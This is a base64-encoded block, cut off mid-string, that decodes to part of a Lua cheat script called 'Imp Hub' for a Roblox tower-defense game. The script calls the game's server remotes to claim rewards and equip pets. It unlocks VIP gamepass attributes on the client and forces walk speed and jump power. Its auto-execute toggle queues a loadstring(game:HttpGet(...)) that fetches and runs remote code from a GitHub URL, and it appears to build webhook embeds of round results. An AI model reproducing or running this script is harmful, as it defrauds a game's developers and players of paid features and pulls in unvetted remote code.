AgICAgICAgICAgICAgICAgInNsZWl0bmlja19rbml0QDEuNy4wIgogICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJTZWFzb25QYXNzU2VydmljZSIpOldhaXRGb3JDaGlsZCgiUkYiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAgICAgIkNsYWltQWxsIgogICAgICAgICAgICAgICAgKTpJbnZva2VTZXJ2ZXIoKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5Mb2JieTpBZGRCdXR0b24oCiAgICB7CiAgICAgICAgVGl0bGUgPSAiQ2xhaW0gRGFpbHkgUmV3YXJkIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICItIFdpbGwgQ2xhaW0gQWxsIFRoZSBEYWlseSBSZXdhcmRzIE9mIFRoZSBXZWVrIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgZm9yIGkgPSAxLCA3IGRvCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJQYWNrYWdlcyIpOldhaXRGb3JDaGlsZCgiX0luZGV4Iik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICJzbGVpdG5pY2tfa25pdEAxLjcuMCIKICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJrbml0Iik6V2FpdEZvckNoaWxkKCJTZXJ2aWNlcyIpOldhaXRGb3JDaGlsZCgiUGxheXRpbWVTZXJ2aWNlIik6V2FpdEZvckNoaWxkKCJSRiIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAiQ2xhaW1EYWlseVJld2FyZCIKICAgICAgICAgICAgICAgICk6SW52b2tlU2VydmVyKGkpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLkxvYmJ5OkFkZFNlY3Rpb24oIlZpc3VhbCDwn6e/IikKClRhYnMuTG9iYnk6QWRkVG9nZ2xlKAogICAgImhhc3ZpcCIsCiAgICB7CiAgICAgICAgVGl0bGUgPSAiVklQIEdhbWVwYXNzIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIGhhc3ZpcCA9IHQKICAgICAgICAgICAgUGxyOlNldEF0dHJpYnV0ZSgiSGFzVklQR2FtZXBhc3MiLCBoYXN2aXApCiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuTG9iYnk6QWRkVG9nZ2xlKAogICAgImhhc3V2aXAiLAogICAgewogICAgICAgIFRpdGxlID0gIlVsdHJhIFZJUCBHYW1lcGFzcyIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBoYXN1dmlwID0gdAogICAgICAgICAgICBQbHI6U2V0QXR0cmlidXRlKCJIYXNVbHRyYVZJUEdhbWVwYXNzIiwgaGFzdXZpcCkKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5Mb2JieTpBZGRTZWN0aW9uKCJVbml0cyDwn5OaIikKClRhYnMuTG9iYnk6QWRkQnV0dG9uKAogICAgewogICAgICAgIFRpdGxlID0gIkVxdWlwIEJlc3QgUGV0cyIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKTpXYWl0Rm9yQ2hpbGQoIl9JbmRleCIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICJzbGVpdG5pY2tfa25pdEAxLjcuMCIKICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJVbml0U2VydmljZSIpOldhaXRGb3JDaGlsZCgiUkYiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAiRXF1aXBCZXN0IgogICAgICAgICAgICApOkludm9rZVNlcnZlcigpCiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuTG9iYnk6QWRkQnV0dG9uKAogICAgewogICAgICAgIFRpdGxlID0gIlVuZXF1aXAgQWxsIFBldHMiLAogICAgICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlBhY2thZ2VzIik6V2FpdEZvckNoaWxkKCJfSW5kZXgiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAic2xlaXRuaWNrX2tuaXRAMS43LjAiCiAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJrbml0Iik6V2FpdEZvckNoaWxkKCJTZXJ2aWNlcyIpOldhaXRGb3JDaGlsZCgiVW5pdFNlcnZpY2UiKTpXYWl0Rm9yQ2hpbGQoIlJGIik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgIlVuZXF1aXBBbGwiCiAgICAgICAgICAgICk6SW52b2tlU2VydmVyKCkKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5QbGF5ZXI6QWRkU2xpZGVyKAogICAgIlNsaWRwZXIiLAogICAgewogICAgICAgIFRpdGxlID0gIldhbGtTcGVlZCIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiIiwKICAgICAgICBEZWZhdWx0ID0gMjAsCiAgICAgICAgTWluID0gMjAsCiAgICAgICAgTWF4ID0gNTAwMCwKICAgICAgICBSb3VuZGluZyA9IDEsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBOdW0gPSB0CiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuUGxheWVyOkFkZFRvZ2dsZSgKICAgICJ3bGsiLAogICAgewogICAgICAgIFRpdGxlID0gIlNldCBXYWxrU3BlZWQiLAogICAgICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgQXV0b1NwZWVkID0gdAogICAgICAgICAgICB3aGlsZSBBdXRvU3BlZWQgZG8KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAwMSkKICAgICAgICAgICAgICAgIHBjYWxsKAogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgUGxyLkNoYXJhY3Rlci5IdW1hbm9pZC5XYWxrU3BlZWQgPSB0b251bWJlcihOdW0pCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLlBsYXllcjpBZGRTbGlkZXIoCiAgICAiU2xpZHBlZXIiLAogICAgewogICAgICAgIFRpdGxlID0gIkp1bXBQb3dlciIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiIiwKICAgICAgICBEZWZhdWx0ID0gMjAsCiAgICAgICAgTWluID0gMjAsCiAgICAgICAgTWF4ID0gNTAwLAogICAgICAgIFJvdW5kaW5nID0gMSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIE51bW0gPSB0CiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuUGxheWVyOkFkZFRvZ2dsZSgKICAgICJleWVoIiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJTZXQgSnVtcFBvd2VyIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIEF1dG9KdW1wID0gdAogICAgICAgICAgICB3aGlsZSBBdXRvSnVtcCBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDAxKQogICAgICAgICAgICAgICAgcGNhbGwoCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBQbHIuQ2hhcmFjdGVyLkh1bWFub2lkLkp1bXBQb3dlciA9IHRvbnVtYmVyKE51bW0pCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLkNyZWRpdHM6QWRkUGFyYWdyYXBoKAogICAgewogICAgICAgIFRpdGxlID0gIkNyZWRpdHMgVG86IiwKICAgICAgICBDb250ZW50ID0gImFsYW4xMWFnbyIKICAgIH0KKQoKVGFicy5DcmVkaXRzOkFkZEJ1dHRvbigKICAgIHsKICAgICAgICBUaXRsZSA9ICJDb3B5IERpc2NvcmQgU2VydmVyIEludml0YXRpb24iLAogICAgICAgIERlc2NyaXB0aW9uID0gIkl0IENvcHlzIFRvIENsaXBib2FyZCBUaGUgSW52aXRhdGlvbSBUbyBTZXJ2ZXIiLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICBzZXRjbGlwYm9hcmQoImh0dHBzOi8vZHNjLmdnL2ltcGh1YiIpCiAgICAgICAgICAgIEZsdWVudDpOb3RpZnkoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGl0bGUgPSAiSW1wIEh1YiIsCiAgICAgICAgICAgICAgICAgICAgQ29udGVudCA9ICLCoUNvcGllZCBJbnZpdGF0aW9uISIsCiAgICAgICAgICAgICAgICAgICAgU3ViQ29udGVudCA9ICJodHRwczovL2RzYy5nZy9pbXBodWIiLAogICAgICAgICAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApCiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuU2V0dGluZ3M6QWRkVG9nZ2xlKAogICAgImF1dG9leGVjdXRlIiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJBdXRvIEV4ZWN1dGUiLAogICAgICAgIERlc2NyaXB0aW9uID0gIldpbGwgSHViIE9uIFBsYWNlIFRlbGVwb3J0IiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBhdXRvZXhlYyA9IHQKICAgICAgICAgICAgaWYgYXV0b2V4ZWMgdGhlbgogICAgICAgICAgICAgICAgcXVldWVfb25fdGVsZXBvcnQoCiAgICAgICAgICAgICAgICAgICAgW1sKICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkKICAgICAgICAgICB1bnRpbCBnYW1lOklzTG9hZGVkKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hbGFuMTFhZ28vSHViL3JlZnMvaGVhZHMvbWFpbi9JbXBIdWIubHVhIikpKCldXQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKU2F2ZU1hbmFnZXI6U2V0TGlicmFyeShGbHVlbnQpCkludGVyZmFjZU1hbmFnZXI6U2V0TGlicmFyeShGbHVlbnQpCgpTYXZlTWFuYWdlcjpJZ25vcmVUaGVtZVNldHRpbmdzKCkKClNhdmVNYW5hZ2VyOlNldElnbm9yZUluZGV4ZXMoe30pCgpJbnRlcmZhY2VNYW5hZ2VyOlNldEZvbGRlcigiSW1wSHViIikKU2F2ZU1hbmFnZXI6U2V0Rm9sZGVyKCJJbXBIdWIvU3BvbmdlYm9iVEQiKQoKSW50ZXJmYWNlTWFuYWdlcjpCdWlsZEludGVyZmFjZVNlY3Rpb24oVGFicy5TZXR0aW5ncykKU2F2ZU1hbmFnZXI6QnVpbGRDb25maWdTZWN0aW9uKFRhYnMuU2V0dGluZ3MpCgpXaW5kb3c6U2VsZWN0VGFiKDEpCgpGbHVlbnQ6Tm90aWZ5KAogICAgewogICAgICAgIFRpdGxlID0gIkltcCBIdWIiLAogICAgICAgIENvbnRlbnQgPSAiVGhlIFNjcmlwdCBIYXMgQmVlbiBMb2FkZWQuIiwKICAgICAgICBEdXJhdGlvbiA9IDgKICAgIH0KKQoKaWYgd29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJGcmllbmRsaWVzIikgdGhlbgogICAgd29ya3NwYWNlLkZyaWVuZGxpZXMuQ2hpbGRBZGRlZDpDb25uZWN0KAogICAgICAgIGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjYpCiAgICAgICAgICAgIGlmIHRvc3RyaW5nKHY6R2V0QXR0cmlidXRlKCJPd25lcklkIikpID09IHRvc3RyaW5nKFBsci5Vc2VySWQpIGFuZCBSZWNvcmRpbmcgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICBTYXZlQWN0aW9uKAogICAgICAgICAgICAgICAgICAgICJQbGFjZSIsCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB1bml0ID0gdi5OYW1lLAogICAgICAgICAgICAgICAgICAgICAgICBjZnJhbWUgPSB0b3N0cmluZyh2LldvcmxkUGl2b3QpLAogICAgICAgICAgICAgICAgICAgICAgICB3YXZlID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLkdhbWVVSS5Ub3AuTWFpbi5TdGFnZUluZm8uRnJhbWUuQ3VycmVudFdhdmUuVGV4dDpnc3ViKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIiVEIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiCiAgICAgICAgICAgICAgICAgICAgICAgICksCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVpcmVkbW9uZXkgPSBHZXRDb3N0KHYuTmFtZSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICBwcmludCgiUGxhY2VkIFVuaXQ6ICIgLi4gdi5OYW1lIC4uICIgQ0ZyYW1lOiAiIC4uIHRvc3RyaW5nKHYuUm9vdFBhcnQuQ0ZyYW1lKSkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICB2OkdldEF0dHJpYnV0ZUNoYW5nZWRTaWduYWwoIkF0dGFja01vZGUiKTpDb25uZWN0KAogICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGlmIFJlY29yZGluZyBhbmQgdG9zdHJpbmcodjpHZXRBdHRyaWJ1dGUoIk93bmVySWQiKSkgPT0gdG9zdHJpbmcoUGxyLlVzZXJJZCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTYXZlQWN0aW9uKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlByaW9yaXR5IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZnJhbWUgPSB0b3N0cmluZyh2LlByaW1hcnlQYXJ0LlBvc2l0aW9uKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmlvcml0eSA9IHY6R2V0QXR0cmlidXRlKCJBdHRhY2tNb2RlIiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2F2ZSA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5HYW1lVUkuVG9wLk1haW4uU3RhZ2VJbmZvLkZyYW1lLkN1cnJlbnRXYXZlLlRleHQ6Z3N1YigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiVEIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuaXQgPSB2Lk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICkKICAgICAgICAgICAgdjpHZXRBdHRyaWJ1dGVDaGFuZ2VkU2lnbmFsKCJVcGdyYWRlIik6Q29ubmVjdCgKICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBpZiBSZWNvcmRpbmcgYW5kIHRvc3RyaW5nKHY6R2V0QXR0cmlidXRlKCJPd25lcklkIikpID09IHRvc3RyaW5nKFBsci5Vc2VySWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgU2F2ZUFjdGlvbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJVcGdyYWRlIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZnJhbWUgPSB0b3N0cmluZyh2LlByaW1hcnlQYXJ0LlBvc2l0aW9uKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGdyYWRlID0gdjpHZXRBdHRyaWJ1dGUoIlVwZ3JhZGUiKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YXZlID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLkdhbWVVSS5Ub3AuTWFpbi5TdGFnZUluZm8uRnJhbWUuQ3VycmVudFdhdmUuVGV4dDpnc3ViKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiJUQiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5pdCA9IHYuTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIHVwZ29uIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgRmx1ZW50Ok5vdGlmeSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICJJbXAgSHViIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb250ZW50ID0gdi5OYW1lIC4uICIgSGFzIFVwZ3JhZGVkIFRvOiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViQ29udGVudCA9IHRvc3RyaW5nKHY6R2V0QXR0cmlidXRlKCJVcGdyYWRlIikpIC4uICIgVXBncmFkZXMiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgKQogICAgICAgIGVuZAogICAgKQplbmQKCmlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiUm91bmRTdW1tYXJ5IikgdGhlbgogICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLlJvdW5kU3VtbWFyeTpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIkVuYWJsZWQiKTpDb25uZWN0KAogICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgc2VuZG9ucmVzdWx0IHRoZW4KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjYpCiAgICAgICAgICAgICAgICBsb2NhbCBIZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgIFsiQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGxvY2FsIGRpZmYgPQogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5Sb3VuZFN1bW1hcnkuTWFpbi5Db250ZW50LlJvdW5kRGF0YS5TdGFnZUluZm8uRGlmZmljdWx0eS5UZXh0IG9yCiAgICAgICAgICAgICAgICAgICAgIkVycm9yIgogICAgICAgICAgICAgICAgbG9jYWwgd29ybGQgPQogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5Sb3VuZFN1bW1hcnkuTWFpbi5Db250ZW50LlJvdW5kRGF0YS5TdGFnZUluZm8uV29ybGRUaXRsZS5UZXh0IG9yCiAgICAgICAgICAgICAgICAgICAgIk1hcCBOb3QgRm91bmQiCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFwdGVyID0KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUm91bmRTdW1tYXJ5Lk1haW4uQ29udGVudC5Sb3VuZERhdGEuU3RhZ2VJbmZvLkNoYXB0ZXJUaXRsZS5UZXh0IG9yCiAgICAgICAgICAgICAgICAgICAgIk5vIENoYXB0ZXIiCiAgICAgICAgICAgICAgICBsb2NhbCB3YXZlcyA9CiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLlJvdW5kU3VtbWFyeS5NYWluLkNvbnRlbnQuUm91bmREYXRhLlJvdW5kU3RhdHMuV2F2ZXMuQW1vdW50LlRleHQgb3IKICAgICAgICAgICAgICAgICAgICAiMCIKICAgICAgICAgICAgICAgIGxvY2FsIHVuaXRzcGxhY2VkID0KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUm91bmRTdW1tYXJ5Lk1haW4uQ29udGVudC5Sb3VuZERhdGEuUm91bmRTdGF0cy5Vbml0c1BsYWNlZC5BbW91bnQuVGV4dCBvcgogICAgICAgICAgICAgICAgICAgICIwIgogICAgICAgICAgICAgICAgbG9jYWwgZG1nID0KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUm91bmRTdW1tYXJ5Lk1haW4uQ29udGVudC5Sb3VuZERhdGEuUm91bmRTdGF0cy5Ub3RhbERhbWFnZS5BbW91bnQuVGV4dCBvcgogICAgICAgICAgICAgICAgICAgICJuaWwiCiAgICAgICAgICAgICAgICBsb2NhbCBraWxscyA9CiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLlJvdW5kU3VtbWFyeS5NYWluLkNvbnRlbnQuUm91bmREYXRhLlJvdW5kU3RhdHMuVGFrZWRvd25zLkFtb3VudC5UZXh0IG9yCiAgICAgICAgICAgICAgICAgICAgIjAiCiAgICAgICAgICAgICAgICBsb2NhbCB0aW1lID0KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUm91bmRTdW1tYXJ5Lk1haW4uQ29udGVudC5Sb3VuZERhdGEuUm91bmRTdGF0cy5QbGF5dGltZS5BbW91bnQuVGV4dCBvcgogICAgICAgICAgICAgICAgICAgICIwOjAwIgogICAgICAgICAgICAgICAgbG9jYWwgdW5pdHMgPSAiIgogICAgICAgICAgICAgICAgbG9jYWwgc3VjY2VzcywgZXJyID0KICAgICAgICAgICAgICAgICAgICBwY2FsbCgKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIGlwYWlycygKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5Sb3VuZFN1bW1hcnkuTWFpbi5Db250ZW50LlVuaXRzWFA6R2V0Q2hpbGRyZW4oCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICApIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiRnJhbWUiKSBhbmQgdjpGaW5kRmlyc3RDaGlsZCgiVW5pdCIpIGFuZCB2OkZpbmRGaXJzdENoaWxkKCJYUEJhciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bml0cyA9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuaXRzIC4uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIqKiIgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIgVW5pdDogIiAuLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIqKiIgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdi5OYW1lIC4uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIHwgTGV2ZWw6ICIgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LlVuaXQuVG93ZXJJbmZvLkxldmVsLlRleHQ6Z3N1YigiPFtePl0rPiIsICIiKSAuLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIHwgWFAgR2FpbmVkOiAiIC4uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LlhQQmFyLkJhci5YUC5UZXh0IC4uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiB8IFJhcml0eTogIiAuLiB2LlJhcml0eS5UZXh0IC4uICJcbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBHZXRUaXRsZSgpCiAgICAgICAgICAgICAgICAgICAgaWYgYWxsb3dldmVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJAZXZlcnlvbmUgVXNlcm5hbWU6ICIgLi4gInx8IiAuLiBQbHIuTmFtZSAuLiAifHwiCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gIlVzZXJuYW1lOiAiIC4uICJ8fCIgLi4gUGxyLk5hbWUgLi4gInx8IgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgbm90IHN1Y2Nlc3MgdGhlbgogICAgICAgICAgICAgICAgICAgIHVuaXRzID0gIkVycm9yIEdldHRpbmcgVW5pdHMgUHJvZ3Jlc3MuIgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBsb2NhbCBEYXRhID0gewogICAgICAgICAgICAgICAgICAgIFsiZW1iZWRzIl0gPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsidGl0bGUiXSA9IEdldFRpdGxlKCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbImRlc2NyaXB0aW9uIl0gPSAiKiogU3BvbmdlYm9iIFRvd2VyIERlZmVuc2UgKiogfCDCoUFuIEdhbWUgSGFzIEp1c3QgRmluaXNoZWQhIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsidHlwZSJdID0gInJpY2giLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgWyJjb2xvciJdID0gMzk5NTUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbImZpZWxkcyJdID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtuYW1lID0gIlvwn5OKXSBQcm9ncmVzcyIsIHZhbHVlID0gdW5pdHMsIGlubGluZSA9IGZhbHNlfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7bmFtZSA9ICJb8J+bpF0gTWFwOiAiLCB2YWx1ZSA9IHdvcmxkLCBpbmxpbmUgPSB0cnVlfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7bmFtZSA9ICJb4o+zXSBUaW1